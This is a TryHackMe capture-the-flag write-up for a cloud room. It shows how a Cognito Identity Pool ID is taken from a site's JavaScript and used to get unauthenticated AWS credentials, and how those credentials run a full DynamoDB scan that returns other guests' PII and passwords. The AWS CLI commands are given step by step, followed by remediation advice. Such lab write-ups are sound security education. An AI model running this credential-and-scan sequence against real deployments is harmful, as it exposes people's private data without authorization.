# 🏝️ Hacker Holidays — The Byte Lotus Hotel

**Platform:** TryHackMe
**Category:** Cloud
**Difficulty:** Easy
**Stack:** AWS Cognito · IAM · DynamoDB

---

## 📌 Overview

The Byte Lotus Hotel challenge focuses on identifying a cloud authorization weakness in a web application that provides guest access without a traditional login system.

The application uses **Amazon Cognito Identity Pools** to obtain temporary AWS credentials and stores guest information in **Amazon DynamoDB**.

**Objectives:**
- Identify how the application obtains AWS credentials
- Discover the Cognito Identity Pool
- Obtain temporary AWS credentials
- Identify the associated IAM role
- Test the permissions granted to the unauthenticated role
- Access records belonging to other guests
- Retrieve the challenge flag

---

## 🛠️ Tools Used

- TryHackMe AttackBox (Linux)
- cURL / wget / grep
- AWS CLI
- Amazon Cognito
- AWS STS
- AWS IAM
- Amazon DynamoDB

---

## 🔎 Enumeration

The target application was hosted on an AWS S3 website endpoint.

First, the HTML was searched for referenced JavaScript files:

```bash
curl -s http://TARGET/ | grep -oE 'src="[^"]+\.js[^"]*"'
```

This revealed:

```
src="https://sdk.amazonaws.com/js/aws-sdk-2.1500.0.min.js"
src="app.js"
```

The application JavaScript was downloaded:

```bash
wget http://TARGET/app.js
```

Then searched for AWS-related configuration:

```bash
grep -iE "cognito|identity|dynamodb|credentials|pool|region|table" app.js
```

This revealed:

```
Identity Pool:
us-east-1:836c0949-292d-485b-b532-52d5ca7bb688

Region:
us-east-1

DynamoDB Table:
complimentary-GuestWellnessProfiles
```

---

## ☁️ Cognito Identity Pool

The JavaScript contained:

```javascript
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

This confirmed the application was obtaining temporary AWS credentials through an Amazon Cognito Identity Pool — without requiring any user login.

An identity was requested using:

```bash
aws cognito-identity get-id \
  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
  --region us-east-1
```

This returned a Cognito `IdentityId`.

---

## 🔐 Obtaining Temporary Credentials

Using the returned Identity ID:

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id <IDENTITY_ID> \
  --region us-east-1
```

This returned a set of temporary AWS credentials:

```
AccessKeyId
SecretKey
SessionToken
```

These were exported into the AttackBox environment:

```bash
export AWS_ACCESS_KEY_ID='YOUR_ACCESS_KEY_ID'
export AWS_SECRET_ACCESS_KEY='YOUR_SECRET_KEY'
export AWS_SESSION_TOKEN='YOUR_SESSION_TOKEN'
export AWS_DEFAULT_REGION='us-east-1'
```

---

## 👤 Identifying the IAM Role

The current AWS identity was verified:

```bash
aws sts get-caller-identity
```

The credentials were associated with:

```
complimentary-cognito-unauth-role
```

This confirmed the application was relying on an **unauthenticated Cognito IAM role** — meaning any anonymous visitor could obtain valid AWS credentials tied to this role simply by loading the page.

---

## 🗄️ DynamoDB Enumeration

The application JavaScript had already disclosed the DynamoDB table name:

```
complimentary-GuestWellnessProfiles
```

The temporary credentials were tested against the table with a full scan:

```bash
aws dynamodb scan \
  --table-name complimentary-GuestWellnessProfiles \
  --region us-east-1 > scan.json
```

The command successfully returned multiple guest records:

```bash
cat scan.json
```

Each record contained fields including:

```
guest_id
name
email
phone
location
password
notes
```

The ability to perform a full, unauthenticated table scan demonstrated that the Cognito unauthenticated role had been granted **excessive DynamoDB permissions** — far beyond what an anonymous guest-facing feature should require.

---

## 🚩 Flag

Successfully retrieved the flag from another guest's DynamoDB record,
confirming the impact of the excessive unauthenticated role permissions.

*(Flag redacted per TryHackMe's writeup guidelines — happy to share
privately if you're validating my work.)*

---

## 🧠 Root Cause & Takeaways

- **Overly permissive unauthenticated IAM role.** Cognito unauth roles are meant to grant *minimal, scoped* access (e.g. read-only access to a single public resource). Here the role was attached to a policy allowing a full `dynamodb:Scan` across a table containing sensitive PII.
- **Client-side trust.** The Identity Pool ID and table name were both discoverable simply by reading the front-end JavaScript — nothing here required insider knowledge.
- **No server-side mediation.** All DynamoDB access happened directly from the browser using Cognito-issued credentials, with no backend layer to enforce per-user data isolation (e.g. row-level filtering by `guest_id`).

**Remediation:**
- Scope the unauthenticated IAM role to the least privilege necessary (e.g. `dynamodb:GetItem` on a single non-sensitive key, never `Scan`/`Query` across all records).
- Never store sensitive fields (passwords, PII) in a table reachable by an unauthenticated identity.
- Introduce a backend API (API Gateway + Lambda) to mediate DynamoDB access and enforce authorization logic server-side, rather than trusting the client directly with table-level credentials.

---

*Writeup based on a completed TryHackMe room.*
